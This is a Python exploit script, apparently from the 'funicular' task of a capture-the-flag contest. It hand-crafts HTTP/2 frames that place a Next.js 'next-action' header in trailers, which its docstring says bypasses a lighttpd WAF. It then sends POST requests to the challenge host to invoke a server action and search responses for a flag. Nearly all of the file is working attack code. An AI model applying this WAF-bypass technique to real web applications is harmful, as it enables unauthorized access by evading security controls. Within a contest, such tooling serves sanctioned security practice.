#!/usr/bin/env python3
"""
probe30: action call via HTTP/2 trailers WAF bypass + iterate body args.

probe29 confirmed: Next-Action header in HTTP/2 trailers bypasses lighttpd WAF.
Backend response was 500 (action errored on body=b"[]"). We now iterate body
shapes — JSON arrays with various args, FormData-like via multipart, etc.

Goal: find body shape that makes recoveryAction succeed (restored:true).
"""
import socket
import ssl
import struct
import time
import json

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()
print(f"# action_id = {ACTION_ID}")

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

from hpack import Encoder


def open_h2():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(PREFACE)
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")  # empty SETTINGS
    return sock


def read_frames(sock, want_stream=1, max_time=10):
    sock.settimeout(max_time)
    buf = b""
    end = False
    out = []
    deadline = time.time() + max_time
    while not end and time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
        while True:
            if len(buf) < 9:
                break
            length = int.from_bytes(buf[:3], "big")
            ftype = buf[3]
            flags = buf[4]
            sid = int.from_bytes(buf[5:9], "big") & 0x7fffffff
            if len(buf) < 9 + length:
                break
            payload = buf[9:9+length]
            buf = buf[9+length:]
            out.append((ftype, flags, sid, payload))
            if sid == want_stream and (ftype in (0, 1) and flags & 0x1):
                end = True
                break
    return out


def parse_response(frames):
    from hpack import Decoder
    dec = Decoder()
    status = None
    body = b""
    headers = []
    for ftype, flags, sid, payload in frames:
        if ftype == 1:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            if flags & 0x20:
                data = data[5:]
            try:
                hdrs = dec.decode(data)
                headers.extend(hdrs)
                for k, v in hdrs:
                    sk = k.decode() if isinstance(k, bytes) else k
                    sv = v.decode() if isinstance(v, bytes) else v
                    if sk == ":status":
                        status = sv
            except Exception:
                pass
        elif ftype == 0:
            data = payload
            if flags & 0x8:
                pad_len = data[0]
                data = data[1:-pad_len] if pad_len else data[1:]
            body += data
    return status, headers, body


def call_action_with_trailer(body_bytes, content_type="text/plain;charset=UTF-8", extra_headers=None):
    """Send POST / with body; place next-action in trailer."""
    sid = 1
    enc = Encoder()
    headers = [
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action"),
        ("user-agent", "p30"),
    ]
    if extra_headers:
        for k, v in extra_headers:
            headers.append((k, v))
    head_block = enc.encode(headers)
    trailer_block = enc.encode([("next-action", ACTION_ID)])

    sock = open_h2()
    sock.settimeout(2)
    try:
        sock.recv(65536)
    except Exception:
        pass
    sock.settimeout(15)
    # HEADERS (END_HEADERS=1, no END_STREAM)
    raw = struct.pack(">I", len(head_block))[1:] + b"\x01" + bytes([0x04]) + struct.pack(">I", sid) + head_block
    sock.sendall(raw)
    # DATA (no END_STREAM)
    raw = struct.pack(">I", len(body_bytes))[1:] + b"\x00" + bytes([0x00]) + struct.pack(">I", sid) + body_bytes
    sock.sendall(raw)
    # TRAILER HEADERS (END_HEADERS=1, END_STREAM=1)
    raw = struct.pack(">I", len(trailer_block))[1:] + b"\x01" + bytes([0x05]) + struct.pack(">I", sid) + trailer_block
    sock.sendall(raw)

    frames = read_frames(sock, want_stream=sid, max_time=10)
    sock.close()
    return parse_response(frames)


def report(label, status, body):
    body_len = len(body)
    is_500 = status == "500"
    is_200 = status == "200"
    is_redirect = status in ("303", "302", "307")
    body_str = body[:300].decode("utf-8", "replace")
    restored = b'"restored":true' in body
    has_error = "Error" in body_str or "error" in body_str
    flag_present = b"alfa{" in body
    marker = ""
    if restored:
        marker = " <RESTORED!>"
    elif flag_present:
        marker = " <FLAG!>"
    elif is_200 and not has_error:
        marker = " <NO-ERR-200>"
    print(f"[{label:50s}] status={status} len={body_len:5d}{marker}")
    if marker or "503" in (status or "") or has_error:
        print(f"    body[:300]: {body_str!r}")


def get_full_500_body():
    """Just call with empty body=[] and dump full body for inspection."""
    print("\n## Full 500 response body (body=[]):")
    status, headers, body = call_action_with_trailer(b"[]")
    print(f"status={status} headers={headers[:8]}")
    print(f"body ({len(body)} bytes):")
    print(body.decode("utf-8", "replace")[:3000])
    return body


# First: dump full 500
full_body = get_full_500_body()

# Save it for offline inspection
with open("/Users/airp0wer/Projects/alfa-ctf-2026/tasks-2026/funicular/artifacts/probe30_500.bin", "wb") as f:
    f.write(full_body)
print("\n# Saved 500 body to artifacts/probe30_500.bin\n")
